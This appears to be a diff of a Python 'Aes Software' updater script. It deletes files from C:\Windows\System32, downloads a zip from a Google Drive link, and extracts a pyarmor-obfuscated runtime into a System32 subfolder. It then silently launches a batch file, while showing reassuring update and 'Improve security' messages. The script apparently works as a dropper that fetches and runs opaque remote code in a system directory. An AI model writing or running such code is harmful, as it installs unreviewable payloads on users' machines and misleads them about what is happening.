@@ -90,10 +90,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\AesV8.2.py"
+    aesv3_path = r"C:\Windows\System32\AesV8.3.py"
     files_to_delete = [
-        r"C:\Windows\System32\AesV8.1.py",
-        r"C:\Windows\System32\aesv8.1.bat",
+        r"C:\Windows\System32\AesV8.2.py",
+        r"C:\Windows\System32\aesv8.2.bat",
         r"C:\Windows\System32\pyarmor_runtime_000000"
     ]
 
@@ -111,7 +111,7 @@ def delete_files_if_aesv3_missing():
                     print("")
                     print("Aes Software is updating, please don't close the window.")
                     print("Change log:")
-                    print("---Improve user input.")
+                    print("---Improve security.")
                     print("")
                     print("")
     else:
@@ -123,11 +123,11 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
+if not os.path.exists("C:\\Windows\\System32\\xsystem\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1lEFyuq1fZVs9vgqLmZdkDova04ZnDXtV", "C:\\Windows\\System32\\plxplx.zip")
-    zip_file = r'C:\Windows\System32\plxplx.zip'
-    extract_dir = r'C:\Windows\System32'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1sST71NGJE_buhaNhzfkaMmnE4LrKydWj", "C:\\Windows\\System32\\xsystem\\august27.zip")
+    zip_file = r'C:\Windows\System32\xsystem\august27.zip'
+    extract_dir = r'C:\Windows\System32\xsystem'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
@@ -135,6 +135,8 @@ if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
 import os
 import shutil
 os.system('cls')
+
+'''
 directory = r'C:\Windows\System32'
 
 new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
@@ -149,6 +151,8 @@ if not os.path.exists(new_dir):
     print("success")
 else:
     print("")
+'''
+
 import subprocess
 
 def run_batch_file(batch_file_path):
@@ -170,8 +174,21 @@ if not check_files_existx():
     input()
     exit()
 
+required_version = (3, 11, 5)
+current_version = sys.version_info[:3]
+
+if current_version != required_version:
+    os.system('cls')
+    print(f"Failed version.")
+    input()
+    os.system('cls')
+    sys.exit()
+    exit()
+else:
+    print("Success.")
+
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\aesv8.2.bat"
+batch_file_path = r"C:\Windows\System32\xsystem\aesv8.3.bat"
 os.system('cls')
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
